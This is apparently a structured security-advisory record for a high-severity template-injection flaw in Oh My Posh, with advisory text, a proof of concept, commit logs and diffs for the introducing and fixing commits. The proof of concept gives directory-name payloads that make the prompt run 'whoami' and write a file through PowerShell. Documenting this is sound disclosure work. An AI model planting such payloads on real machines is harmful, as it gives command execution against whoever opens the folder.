# GHSA-6XJ8-QV9J-XCJQ

repo: JanDeDobbeleer/oh-my-posh

summary: Oh My Posh: Arbitrary command execution via template injection in the path segment

aliases: ['CVE-2026-73505']

severity: HIGH

evidence: blame blamed_lines=1 files=['src/prompt/extra.go']

intro: 367ec8331b4c00429fd7148a5cd367ff125d54e0

intro_subject: feat(transient): support right-aligned template

intro_date: 2026-07-12T19:48:17+09:00

fix: 88ddbe0b0a4dd13cc345996108c9869493f2c690

affected: [
  {
    "package": {
      "ecosystem": "Go",
      "name": "github.com/jandedobbeleer/oh-my-posh"
    },
    "ranges": [
      {
        "type": "ECOSYSTEM",
        "events": [
          {
            "introduced": "0"
          },
          {
            "fixed": "29.35.1"
          }
        ]
      }
    ],
    "database_specific": {
      "last_known_affected_version_range": "<= 29.35.0"
    }
  }
]

DETAILS:
### Summary
Oh My Posh re-renders the resolved path string, which contains the raw folder names taken from the filesystem, through the Go `text/template` engine. That engine's function map exposes a `cmd` function that runs arbitrary OS commands. A directory whose name contains a Go template expression is therefore evaluated when the prompt renders, giving arbitrary command execution as the current user as soon as the shell is inside (or below) that directory. The built-in default configuration is affected.

### Details
`src/segments/path.go`, `setStyle()`:

```go
// make sure we resolve all templates
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```

`pt.Path` is built from the raw folder-name components of the current working directory (`colorizePath` inserts each folder name verbatim via `fmt.Sprintf(folderFormat, element)`). The whole string is then passed to `template.Render`, which parses and executes it with the full function map from `src/template/func_map.go`, including:

```go
func cmd(command string, args ...string) (string, error) {
    output, err := env.RunCommand(command, args...)
    return strings.TrimSpace(output), err
}
```

Any template syntax present in an untrusted folder name is evaluated. The render runs after the path-style switch unconditionally, so every path style is affected, and the default config (`src/config/default.go`) contains a path segment.

### PoC
Config (a single default path segment):

```json
{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"path","style":"plain","foreground":"#ffffff",
   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
```

Command execution reflected into the prompt (`--pwd` supplies exactly the string `env.Pwd()` returns for a real directory of that name; on Linux/macOS such a directory is fully creatable, only `/` and NUL are disallowed):

```
$ oh-my-posh print primary --config p.json --shell fish \
      --pwd '/home/v/{{ cmd `whoami` }}'
/home/v/<username>        # whoami executed, output substituted
```

Side effect (file write), slash-free payload, verified on Windows:

```
$ RCE_OUT=/tmp/proof oh-my-posh print primary --config p.json --shell fish \
      --pwd '/home/v/{{ cmd `powershell` `-c` `sc $env:RCE_OUT pwn3d` }}'
$ cat /tmp/proof
pwn3d
```

Confirmed to fire under full, folder, agnoster, agnoster_short, mixed and letter path styles.

### Impact
Arbitrary command execution as the victim user, triggered b

REFS:
- WEB https://github.com/JanDeDobbeleer/oh-my-posh/security/advisories/GHSA-6xj8-qv9j-xcjq
- WEB https://github.com/JanDeDobbeleer/oh-my-posh/commit/88ddbe0b0a4dd13cc345996108c9869493f2c690
- PACKAGE https://github.com/JanDeDobbeleer/oh-my-posh
- WEB https://github.com/JanDeDobbeleer/oh-my-posh/releases/tag/v29.35.1
- WEB https://github.com/JanDeDobbeleer/oh-my-posh/releases/tag/v29.36.0

INTRO_LOG:
367ec8331b4c00429fd7148a5cd367ff125d54e0
JamBalaya56562 <jambalaya.pyoncafe@outlook.jp>
2026-07-13T16:30:38+02:00
feat(transient): support right-aligned template

Adds a right_template option to the transient prompt, rendered
right-aligned at the end of the line. Supported in zsh (via RPROMPT)
and pwsh (via cursor save/restore, mirroring writePrimaryRightPrompt).
When a filler is configured it now fills the gap between both parts.

Also guards shouldFill against a negative padding length which would
panic in strings.Repeat.

resolves #4822

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>



INTRO_STAT:
 src/config/segment.go                    |   1 +
 src/prompt/engine.go                     |   5 +
 src/prompt/extra.go                      | 104 +++++++--
 src/prompt/extra_test.go                 | 353 +++++++++++++++++++++++++++++++
 src/prompt/streaming.go                  |   8 +
 themes/schema.json                       |   5 +
 website/docs/configuration/transient.mdx |   1 +
 7 files changed, 459 insertions(+), 18 deletions(-)


INTRO_DIFF_OVERLAP:
diff --git a/src/prompt/extra.go b/src/prompt/extra.go
index 6a506736..4bfab9cc 100644
--- a/src/prompt/extra.go
+++ b/src/prompt/extra.go
@@ -2,6 +2,7 @@ package prompt
 
 import (
 	"fmt"
+	"strings"
 
 	"github.com/jandedobbeleer/oh-my-posh/src/color"
 	"github.com/jandedobbeleer/oh-my-posh/src/config"
@@ -78,34 +79,101 @@ func (e *Engine) ExtraPrompt(promptType ExtraPromptType) string {
 
 	str, length := terminal.String()
 
-	if promptType == Transient && len(prompt.Filler) != 0 {
+	if promptType != Transient {
+		return str
+	}
+
+	rightStr, rightLength := e.renderRightTemplate(prompt, background, foreground)
+
+	var padText string
+	if len(prompt.Filler) != 0 {
 		consoleWidth, err := e.Env.TerminalWidth()
 		if err == nil || consoleWidth != 0 {
-			if padText, OK := e.shouldFill(prompt.Filler, consoleWidth-length); OK {
-				str += padText
-			}
+			padText, _ = e.shouldFill(prompt.Filler, consoleWidth-length-rightLength)
 		}
 	}
 
+	// for pwsh, the padding moves inside the cursor save/restore sequence
+	// when a right-aligned template is rendered, see transientPWSH
+	if e.Env.Shell() != shell.PWSH || rightLength == 0 {
+		str += padText
+	}
+
 	switch e.Env.Shell() {
 	case shell.ZSH:
-		if promptType == Transient {
-			if !e.Env.Flags().Eval {
-				break
-			}
-
-			prompt := fmt.Sprintf("PS1=%s", shell.QuotePosixStr(str))
-			// empty RPROMPT
-			prompt += "\nRPROMPT=''"
-			return prompt
+		if !e.Env.Flags().Eval {
+			return str
 		}
+
+		return e.transientZSH(str, rightStr)
 	case shell.PWSH:
-		if promptType == Transient {
-			// clear the line afterwards to prevent text from being written on the same line
-			// see https://github.com/JanDeDobbeleer/oh-my-posh/issues/3628
-			return str + terminal.ClearAfter()
-		}
+		return e.transientPWSH(str, padText, rightStr, length, rightLength)
 	}
 
 	return str
 }
+
+// transientZSH returns the transient prompt as an eval statement setting
+// both PS1 and RPROMPT, letting zsh align the right-aligned template natively.
+func (e *Engine) transientZSH(str, rightStr string) string {
+	// Warp doesn't support RPROMPT
+	if e.isWarp() {
+		rightStr = ""
+	}
+
+	prompt := fmt.Sprintf("PS1=%s", shell.QuotePosixStr(str))
+	prompt += fmt.Sprintf("\nRPROMPT=%s", shell.QuotePosixStr(rightStr))
+	return prompt
+}
+
+// transientPWSH appends the right-aligned template to the transient prompt by
+// writing the gap and the right-aligned text, then restoring the cursor to
+// right after the left part so the accepted command is drawn there,
+// mirroring writePrimaryRightPrompt.
+func (e *Engine) transientPWSH(str, padText, rightStr string, length, rightLength int) string {
+	// clear the line afterwards to prevent text from being written on the same line
+	// see https://github.com/JanDeDobbeleer/oh-my-posh/issues/3628
+	str += terminal.ClearAfter()
+
+	if rightLength == 0 {
+		return str
+	}
+
+	consoleWidth, err := e.Env.TerminalWidth()
+	if err != nil || consoleWidth == 0 {
+		return str
+	}
+
+	gap := consoleWidth - length - rightLength
+	if gap < 0 {
+		return str
+	}
+
+	if len(padText) == 0 {
+		padText = strings.Repeat(" ", gap)
+	}
+
+	return str + terminal.SaveCursorPosition() + padText + rightStr + terminal.RestoreCursorPosition()
+}
+
+// renderRightTemplate renders the transient prompt's right-aligned template.
+// Only zsh (via RPROMPT) and pwsh (via cursor save/restore) can display it.
+func (e *Engine) renderRightTemplate(prompt *config.Segment, background, foreground color.Ansi) (string, int) {
+	if len(prompt.RightTemplate) == 0 {
+		return "", 0
+	}
+
+	switch e.Env.Shell() {
+	case shell.ZSH, shell.PWSH:
+	default:
+		return "", 0
+	}
+
+	text, err := template.Render(prompt.RightTemplate, nil)
+	if err != nil {
+		text = err.Error()
+	}
+
+	terminal.Write(background, foreground, text)
+	return terminal.String()
+}


FIX_LOG:
88ddbe0b0a4dd13cc345996108c9869493f2c690
Jan De Dobbeleer <jan.de.dobbeleer@gmail.com>
2026-07-23T12:44:26+02:00
fix(template): gate cmd/readFile/stat/glob behind trusted templates

template.Render's func map exposed cmd/readFile/stat/glob/env/expandenv
to any string passed as the template argument, with no way to tell a
template the user authored in their config from one built at runtime
out of external data (filesystem names, command output, ...). That
distinction is exactly what let a malicious folder name reach cmd
(fixed for that one call site in a prior commit); nothing stopped the
same class of bug from reappearing at a future call site.

Split Render into two explicitly named functions instead: RenderTrusted
keeps the full func map and is for template text read verbatim from a
config field (segment/block/palette templates, mapped_locations keys,
folder_separator_template, ...) — every existing call site converts to
it. RenderUntrusted drops cmd/readFile/stat/glob/env/expandenv and is
for text that may contain or be composed from runtime data; pt.Path in
path.go's setStyle(), the one sink that re-renders a string composed
from raw filesystem folder names, uses it. Neither name is shorter or
more "default" than the other, so there's no ambient plain Render a
future call site could reach for without first deciding which one it
means. The parsed-template cache key includes the trust level so a
trusted and an untrusted render of identical text can never share a
cached *template.Template and its func map.

Entire-Checkpoint: 597e5a60d968



FIX_STAT:
 src/color/colors.go               |  2 +-
 src/color/palette.go              |  2 +-
 src/config/config.go              |  2 +-
 src/config/segment.go             |  6 ++--
 src/prompt/engine.go              |  6 ++--
 src/prompt/extra.go               |  4 +--
 src/segments/http.go              |  2 +-
 src/segments/language.go          |  2 +-
 src/segments/options/map.go       |  2 +-
 src/segments/path.go              | 13 +++++---
 src/segments/path_test.go         |  2 +-
 src/segments/path_unix_test.go    |  7 +++++
 src/segments/path_windows_test.go | 10 +++++++
 src/segments/scm.go               |  2 +-
 src/segments/status.go            |  4 +--
 src/template/bench_test.go        |  6 ++--
 src/template/cmd_test.go          |  2 +-
 src/template/date_test.go         |  4 +--
 src/template/files_test.go        |  2 +-
 src/template/func_map.go          | 63 +++++++++++++++++++++++++++++++++------
 src/template/link_test.go         |  4 +--
 src/template/list.go              |  4 +--
 src/template/locale_test.go       | 10 +++----
 src/template/numbers_test.go      |  2 +-
 src/template/pool_test.go         |  4 +--
 src/template/render.go            | 37 +++++++++++++----------
 src/template/round_test.go        |  2 +-
 src/template/strings_test.go      |  2 +-
 src/template/text.go              | 31 ++++++++++++++++---
 src/template/text_test.go         |  6 ++--
 30 files changed, 171 insertions(+), 74 deletions(-)


FIX_DIFF_OVERLAP:
diff --git a/src/prompt/extra.go b/src/prompt/extra.go
index e458350f..7cf86dec 100644
--- a/src/prompt/extra.go
+++ b/src/prompt/extra.go
@@ -57,7 +57,7 @@ func (e *Engine) ExtraPrompt(promptType ExtraPromptType) string {
 		}
 	}
 
-	promptText, err := template.Render(getTemplate(prompt.Template), nil)
+	promptText, err := template.RenderTrusted(getTemplate(prompt.Template), nil)
 	if err != nil {
 		promptText = err.Error()
 	}
@@ -192,7 +192,7 @@ func (e *Engine) renderRightTemplate(prompt *config.Segment, background, foregro
 		return "", 0
 	}
 
-	text, err := template.Render(prompt.RightTemplate, nil)
+	text, err := template.RenderTrusted(prompt.RightTemplate, nil)
 	if err != nil {
 		text = err.Error()
 	}


intro_is_ancestor_of_fix: True

tags_contain_intro_sample: []

tags_contain_fix_sample: []

tags_with_intro_not_fix_sample: []